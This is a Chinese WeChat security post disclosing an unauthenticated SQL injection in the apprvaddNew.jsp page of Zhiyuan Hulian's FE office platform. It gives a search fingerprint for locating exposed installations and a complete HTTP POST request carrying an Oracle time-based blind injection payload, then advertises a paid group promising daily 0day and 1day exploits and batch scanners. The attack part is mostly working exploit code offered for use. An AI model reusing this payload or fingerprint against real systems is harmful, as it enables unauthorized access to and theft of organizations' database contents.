#  【HW漏洞】致远互联FE协作办公平台apprvaddNew存在SQL注入漏洞   
小白菜安全  小白菜安全   2024-08-02 18:46  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgxnz3h9W4zxUezdEZiaBGSsPMwDcYyJiaq6oqiaXuW8wdaNQoNDpczOZtg/640?wx_fmt=gif&from=appmsg "")  
  
漏洞描述  
  
  
致远互联FE协作办公平台apprvaddNew.jsp存在SQL注入漏洞,未经身份验证的攻击者可以通过此漏洞获取数据库敏感信息。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgxnz3h9W4zxUezdEZiaBGSsPMwDcYyJiaq6oqiaXuW8wdaNQoNDpczOZtg/640?wx_fmt=gif&from=appmsg "")  
  
资产信息  
  
  
body="li_plugins_download"  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia0ZbRj9wvS2mR7ItZ9py635UqW7hsqWtliaEEy3IzaEnRHsJ2XHtIMaOfbBiaogXHqRuUuannXrgq0Q/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgxnz3h9W4zxUezdEZiaBGSsPMwDcYyJiaq6oqiaXuW8wdaNQoNDpczOZtg/640?wx_fmt=gif&from=appmsg "")  
  
漏洞复现  
  
延时注入3秒  
```
POST /witapprovemanage/apprvaddNew.jsp HTTP/1.1
Host: 
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 95

flowid=1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(79)||CHR(116)||CHR(104)||CHR(85),3) AND '1'='1
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia0ZbRj9wvS2mR7ItZ9py635pxuVMH6oxPOprDBt9MDhjobuEOmPJDj8lU2FicWC5UDviaCGksadwa2w/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgxnz3h9W4zxUezdEZiaBGSsPMwDcYyJiaq6oqiaXuW8wdaNQoNDpczOZtg/640?wx_fmt=gif&from=appmsg "")  
  
圈子推荐  
  
  
‍  
‍  
高  
质量安全社区，每天至少更新一个0Day/Nday/1day漏洞POC，互联网上各种安全工具整合以及更新维护，  
后期圈子还会自研工具并分享。高质量的漏洞文库可以给师傅们在护网以及SRC中提供帮助。  
  
**【圈子相关】**  
  
**********1.本圈每日更新最新互联网公开/未公开1day**  
  
**2.不定期更新0day poc**  
  
**3.分享各种安全工具并实时对工具更新维护**  
  
**4.不定期对漏洞进行整合并发布批量验证脚本（目前基于nuclei实现，且关注重点系统：如OA\海康等）**  
  
**5.圈子专属漏洞文库，每日也会更新POC（最近2024护网漏洞也在持续更新）**  
  
**6.微信交流圈，**  
前100名师傅享20优惠哦，先到先得  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/NhLcT1kxlia3pHYZxSQ16eMVVb5wV79ASKiaotOcWW0fCFR8QibI8YekuubOaCSJW2kKaJL4Q6Ns0E6BodL2UwpGw/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgOaSVwdVAPT7DWSKK7pjSWGdbQKWEM0yTB3JSqNxLUnEBesOW8eG40w/640?wx_fmt=png&from=appmsg "")  
  
免责声明  
  
  
该公众号主要是分享互联网上公开的一些漏洞poc和工具，  
利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，本公众号及作者不为此承担任何责任，一旦造成后果请自行承担！如果本公众号分享导致的侵权行为请告知，我们会立即删除并道歉。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgAth2WTu4kyEzL1Dia7AXUWcP7tsbHDtpaH1cls1lJTPVNE6XTwLYvJg/640?wx_fmt=gif&from=appmsg "")  
  
  
  
